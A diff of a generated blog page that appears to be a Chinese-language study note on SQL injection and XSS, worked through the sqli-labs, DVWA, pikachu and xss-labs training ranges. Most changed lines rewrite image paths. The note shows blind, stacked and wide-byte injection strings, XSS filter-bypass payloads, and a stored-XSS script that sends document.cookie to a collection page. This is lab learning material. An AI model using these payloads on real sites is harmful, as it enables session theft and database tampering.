-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\76.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\76.png" alt></p>
 <p>也可直接查看页面返回时间：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\77.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\77.png" alt></p>
 <p>若无’，发现sleep函数没生效，说明语句有误：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\78.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\78.png" alt></p>
 <p>由此判断’是闭合字符</p>
 <h5 id="second-2"><a href="#second-2" class="headerlink" title="second"></a>second</h5><p>查询数据库名</p>
 <p>if(条件,命令1,命令2) </p>
@@ -367,70 +367,70 @@ MathJax = {
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
 <p>此时无法应用BP爆破，因返回相同，无法通过长度判断</p>
 <h3 id="SQL注入类型——堆叠查询-Less-38"><a href="#SQL注入类型——堆叠查询-Less-38" class="headerlink" title="SQL注入类型——堆叠查询(Less-38)"></a>SQL注入类型——堆叠查询(Less-38)</h3><p>即一次性执行多个sql语句</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\79.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\79.png" alt></p>
 <h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>使用联合查询、报错注入亦可</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;;insert into users values(18,&#x27;</span>zhong<span class="string">&#x27;,&#x27;</span>zhong<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>
-<h3 id="SQL注入类型——宽字节注入-Less-32"><a href="#SQL注入类型——宽字节注入-Less-32" class="headerlink" title="SQL注入类型——宽字节注入(Less-32)"></a>SQL注入类型——宽字节注入(Less-32)</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\80.png" alt></p>
+<h3 id="SQL注入类型——宽字节注入-Less-32"><a href="#SQL注入类型——宽字节注入-Less-32" class="headerlink" title="SQL注入类型——宽字节注入(Less-32)"></a>SQL注入类型——宽字节注入(Less-32)</h3><p><img src="/F:/blog\source\_posts\漏洞part\80.png" alt></p>
 <h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>%df</p>
 <p>%5c为/</p>
 <h3 id="post注入Less-11"><a href="#post注入Less-11" class="headerlink" title="post注入Less-11"></a>post注入Less-11</h3><p>先抓包再测试</p>
-<h2 id="sqli-labs工具破解"><a href="#sqli-labs工具破解" class="headerlink" title="sqli-labs工具破解"></a>sqli-labs工具破解</h2><h1 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\81.png" alt></p>
+<h2 id="sqli-labs工具破解"><a href="#sqli-labs工具破解" class="headerlink" title="sqli-labs工具破解"></a>sqli-labs工具破解</h2><h1 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h1><p><img src="/F:/blog\source\_posts\漏洞part\81.png" alt></p>
 <p>常见攻击效果为弹窗。</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\82.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\83.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\82.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\83.png" alt></p>
 <p>在能够输入的位置，便容易存在XSS漏洞</p>
-<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\84.png" alt></p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><img src="/F:/blog\source\_posts\漏洞part\84.png" alt></p>
 <p>其中，可将长网址缩短，生成短链接</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\85.png" alt></p>
-<h4 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\89.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\90.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\91.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\92.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\85.png" alt></p>
+<h4 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h4><p><img src="/F:/blog\source\_posts\漏洞part\89.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\90.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\91.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\92.png" alt></p>
 <p>重新访问页面时，无结果，为一次性的</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\93.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\93.png" alt></p>
 <h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>存在于留言板</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\86.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\87.png" alt></p>
-<h4 id="DVWA靶场-1"><a href="#DVWA靶场-1" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\95.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\96.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\86.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\87.png" alt></p>
+<h4 id="DVWA靶场-1"><a href="#DVWA靶场-1" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h4><p><img src="/F:/blog\source\_posts\漏洞part\95.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\96.png" alt></p>
 <p>刷新后，发现会重复弹窗</p>
 <p>做完后到数据库中删除：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\97.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\98.png" alt="98"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\97.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\98.png" alt="98"></p>
 <p>重新访问页面后不会出现弹窗</p>
 <h5 id="延申"><a href="#延申" class="headerlink" title="延申"></a>延申</h5><p>若输入长度被限制</p>
 <p>用F12打开，在查看器中，快速定位被限制的位置，修改maxlength参数：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\94.png" alt></p>
-<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\88.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\94.png" alt></p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><img src="/F:/blog\source\_posts\漏洞part\88.png" alt></p>
 <h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4><p>使用onclick标签，点击后触发：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\99.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\100.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\101.png" alt="101"></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\99.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\100.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\101.png" alt="101"></p>
 <h3 id="三种类型之间的区别"><a href="#三种类型之间的区别" class="headerlink" title="三种类型之间的区别"></a>三种类型之间的区别</h3><p>反射型不与数据库发生交互</p>
 <p>存储型会写入数据库，危害最大</p>
 <p>dom型只存在页面，不与服务器交互</p>
 <h2 id="xss-labs-master靶场"><a href="#xss-labs-master靶场" class="headerlink" title="xss-labs-master靶场"></a>xss-labs-master靶场</h2><p>搭建简单，不存在与数据库连接，直接放在WWW目录下即可访问</p>
-<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\102.png" alt></p>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p><img src="/F:/blog\source\_posts\漏洞part\102.png" alt></p>
 <p>观察页面url：</p>
 <p>其向服务器提交了一个name参数，值为“test”</p>
 <p>观察页面回显：</p>
 <p>该页面将name参数的值显示在了页面上，并且显示了name参数值的字符长度</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\103.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\103.png" alt></p>
 <p>查看源码发现将name的参数值，插入到了</p><h2> </h2>标签之间，即考察反射型xss<p></p>
 <p>由于不知道服务器端对于提交的敏感字符有没有过滤，所以直接在name参数中赋值简单的弹窗进行测试：</p>
 <script>alert('xss')</script>
 
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\104.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\104.png" alt></p>
 <p>用于js弹窗的代码顺利执行</p>
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h4 id="服务器端用htmlspecialchars-函数对keyword参数的值进行处理"><a href="#服务器端用htmlspecialchars-函数对keyword参数的值进行处理" class="headerlink" title="服务器端用htmlspecialchars()函数对keyword参数的值进行处理"></a>服务器端用htmlspecialchars()函数对keyword参数的值进行处理</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\105.png" alt></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h4 id="服务器端用htmlspecialchars-函数对keyword参数的值进行处理"><a href="#服务器端用htmlspecialchars-函数对keyword参数的值进行处理" class="headerlink" title="服务器端用htmlspecialchars()函数对keyword参数的值进行处理"></a>服务器端用htmlspecialchars()函数对keyword参数的值进行处理</h4><p><img src="/F:/blog\source\_posts\漏洞part\105.png" alt></p>
 <p>这一关加入了“输入框”和“搜索”</p>
 <p>从url入手看，依然是get方式传参，初步判断为反射型xss</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\106.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\106.png" alt></p>
 <p>从源码来看，其功能是通过点击“搜索”按钮，将输入框内的内容以get方式提交给服务器上的level2.php，经过服务器的动态处理之后又会将参数keyword的值插入到</p><h2> </h2>标签之中以及添加到<input>标签中的value属性的值内。<p></p>
 <p>同样使用上一关的恶意语句操作进行弹窗，但是出现报错：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\107.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\107.png" alt></p>
 <p>查看源代码发现在<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中的恶意代码被编码为html字符实体：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\108.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\108.png" alt></p>
 <p>发现插入到value参数值中的恶意代码并没有被编码而是直接原样返回：</p>
 <input name="keyword" value="<script>alert('xss')</script>">
 
@@ -438,17 +438,17 @@ MathJax = {
 <p>将属性的引号和标签先闭合，让浏览器执行这里的弹窗代码</p>
 <p>将keyword的参数值重新赋值：</p>
 <p>“&gt;<script>alert('xss')</script>//</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\109.png" alt></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\110.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\109.png" alt></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><img src="/F:/blog\source\_posts\漏洞part\110.png" alt></p>
 <p>输入test测试，查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\111.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\111.png" alt></p>
 <p>类level2</p>
 <p>由于不知道服务器端对于提交的敏感字符有没有过滤、编码，构造弹窗进行测试，报错：</p>
 <script>alert('xss')</script>
 
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\112.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\112.png" alt></p>
 <p>查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\113.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\113.png" alt></p>
 <p>这两处都将&lt;和&gt;这样的敏感字符编码成了html字符实体。</p>
 <p>猜测服务器端在这两处都用htmlspecialchars()函数进行了处理，于是通过<input>标签的一些特殊事件onfocus来执行js代码，onfocus事件在对象获得焦点时发生。</p>
 <p>即对于网页上的一个输入框，当使用鼠标点击该输入框时输入框被选中可以输入内容的时候就是该输入框获得焦点的时候,此时输入框就会触发onfocus事件。</p>
@@ -457,25 +457,25 @@ MathJax = {
 <input name="keyword" value="&lt;script&gt;alert(" xss')&lt; script&gt;'>    
 
 <p>‘onfocus=javascript:alert(‘xss’) ‘</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\114.png" alt></p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\115.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\114.png" alt></p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p><img src="/F:/blog\source\_posts\漏洞part\115.png" alt></p>
 <p>还是用get方式请求参数并且该参数值在页面上有两处显示，利用弹窗代码测试：</p>
 <script>alert('xss')</script>
 
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\116.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\116.png" alt></p>
 <p>发现只有在输入框中与提交的参数值有区别，<code>&lt;</code>和<code>&gt;</code>消失，查看网页源码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\117.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\117.png" alt></p>
 <p>第一处将&lt;和&gt;编码转换，第二处将&lt;和&gt;删除。</p>
 <p>但是，事件触发却不需要使用这两个符号，用上一关的代码：</p>
 <input name="keyword" value="scriptalert('xss')/script">
 
 <p>“onfocus=javascript:alert(‘xss’) “</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\118.png" alt></p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\119.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\118.png" alt></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="/F:/blog\source\_posts\漏洞part\119.png" alt></p>
 <p>还是get方式请求参数，所以还是反射型的xss，用弹窗代码测试：<script>alert('xss')</script></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\120.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\120.png" alt></p>
 <p>发现报错，查看网页源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\121.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\121.png" alt></p>
 <p>第一处被htmlspecialchars()函数将&lt;和&gt;进行了编码处理</p>
 <p>第二处在显示位可以看到恶意代码<script>中添加了一个_符号</p>
 <p>用之前事件触发的代码进行测试：</p>
@@ -490,79 +490,79 @@ MathJax = {
 <p><img src="F:\blog\source\_posts\漏洞part\125.png" alt=""></p>
 <h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p><img src="F:\blog\source\_posts\漏洞part\126.png" alt=""></p>
 <p>看上去和之前没有区别，用弹窗代码测试：<script>alert('xss')</script></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\127.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\127.png" alt></p>
 <p>发现报错，查看源码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\128.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\128.png" alt></p>
 <p>第一处还是<code>&lt;</code>和<code>&gt;</code>被编码了</p>
 <p>第二处是在script字符中插入<code>_</code>破坏语义</p>
 <p>尝试事件触发的代码进行尝试：</p>
 <p>“onfocus=javascript:alert(‘xss’)”</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\130.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\129.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\130.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\129.png" alt></p>
 <p>可以看到在value属性值中也插入了<code>_</code>符号防止xss的发生</p>
 <p>尝试上一关的<code>&lt;a&gt;</code>标签：</p>
 <p>“&gt; <a href="javascript:alert('xss')"> xss</a></p>
 <p>也报错了</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\131.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\131.png" alt></p>
 <p>xss链接无法点击，查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\132.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\132.png" alt></p>
 <p>尝试大小写混写能不能绕过，改动<code>&lt;a&gt;</code>标签中的<code>href</code>属性的大小写，在html中对大小写是不敏感的。</p>
 <p>“&gt; <a href="javascript:alert('xss')"> xss</a></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\133.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\133.png" alt></p>
 <p>点击页面回显的<code>xss</code>链接：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\134.png" alt></p>
-<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\135.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\134.png" alt></p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="/F:/blog\source\_posts\漏洞part\135.png" alt></p>
 <p>看上去和之前没有区别，用弹窗代码测试：<script>alert('xss')</script></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\136.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\136.png" alt></p>
 <p>查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\137.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\137.png" alt></p>
 <p>第一处将&lt;和&gt;进行编码处理</p>
 <p>第二处把script字符直接删除</p>
 <script>alert('xss')</script>
 
 <p>尝试双写关键字</p>
 <p>“&gt;<sscriptcript>alert(‘xss’)</sscriptcript></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\141.png" alt></p>
-<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\142.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\143.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\141.png" alt></p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="/F:/blog\source\_posts\漏洞part\142.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\143.png" alt></p>
 <p>弹窗代码：</p>
 <script>alert('xss')</script>
 
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\144.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\144.png" alt></p>
 <p>第一处&lt;和&gt;被编码</p>
 <p>第二处在href属性值中script字符被插入了_字符破坏语义</p>
 <p>“onfocus=javascript:alert(‘xss’)”</p>
 <p>查看源码发现用来闭合引号的引号被编码，onfocus一类的事件也被破坏：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\145.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\145.png" alt></p>
 <p>大小写绕过，也失败。在此处没有对关键字进行删除，不进行双写测试。</p>
 <p>将要提交的js代码javascript:alert(‘xss’)进行编码防止插入_字符导致语义的破坏：</p>
 <p><a target="_blank" rel="noopener" href="https://www.toolnb.com/tools/htmlende.html">HTML实体编码互转 - 爱资料工具 (toolnb.com)</a></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\147.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\147.png" alt></p>
 <p>输入后，点击“添加友情链接”，查看源代码，发现“友情链接”里面（<a></a>）的代码正常：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\149.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\149.png" alt></p>
 <p>故再点击“友情链接”：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\148.png" alt></p>
-<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\150.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\148.png" alt></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="/F:/blog\source\_posts\漏洞part\150.png" alt></p>
 <p>提交的参数值插入到了标签的value属性值中，但是在<a>标签的href属性中没有出现该参数值，而是显示的是字符串： “您的链接不合法？有没有！”，猜测这里对url地址做了匹配，只有包含正常的url地址才能添加到href属性值中。</a></p>
 <p>构造一个有正常url地址的恶意代码：</p>
 <p>javascript:alert(‘xss’)<a target="_blank" rel="noopener" href="http://www.baidu.com">http://www.baidu.com</a></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\151.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\151.png" alt></p>
 <p>语句显示在了href属性值中，但是javascript字符被插入了_，尝试用大小写绕过：</p>
 <p>jAvAscriPt:alert(‘xss’)<a target="_blank" rel="noopener" href="http://www.baidu.com">http://www.baidu.com</a></p>
 <p>仍然失败：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\152.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\152.png" alt></p>
 <p>尝试对关键字进行编码，同level9，但不行。从服务器端看源文件代码，有语句指出：如果字符中没有<a href="http://的话就会返回false，接着在href属性值中就会出现&quot;您的链接不合法？有没有！">http://的话就会返回false，接着在href属性值中就会出现&quot;您的链接不合法？有没有！</a>“</p>
 <p>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;//http://</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\153.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\153.png" alt></p>
 <h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>与之前不一样</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\154.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\154.png" alt></p>
 <p>查看源代码，发现在源码中有隐藏的表单，含有<code>t_link</code> <code>t_history</code> <code>t_sort</code>三个隐藏的<code>&lt;input&gt;</code>标签：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\155.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\155.png" alt></p>
 <p>利用弹窗代码测试：</p>
 <script>alert('xss')</script>
 
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\156.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\157.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\156.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\157.png" alt></p>
 <p>从三个<input>标签入手：</p>
 <script>alert('xss')</script>&t_link=" type="text"&t_history=" type="text"&t_sort=" type="text"
 
@@ -620,155 +620,155 @@ MathJax = {
 
 首先搭建pikachu Xss 后台（相当于前面的第三方平台）：
 
-<img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\146.png" style="zoom:67%;">
+<img src="/F:/blog\source\_posts\漏洞part\146.png" style="zoom:67%;">
 
 同样利用pikachu中存储型xss（另开一个页面）进行攻击，攻击代码如下：
 
 <script>document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/pkxss_cookie_result.php' + document.cookie;</script>
 
 <p>地址为接受cookie值的地址，即如下界面：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\170.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\170.png" alt></p>
 <p>开始攻击：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\171.png" alt></p>
-<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\172.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\173.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\171.png" alt></p>
+<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p><img src="/F:/blog\source\_posts\漏洞part\172.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\173.png" alt></p>
 <p>即受害者能做什么，攻击者就能以受害者的身份做什么</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\174.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\175.png" alt></p>
+<p><img src="/F:/blog\source\_posts\漏洞part\174.png" alt></p>
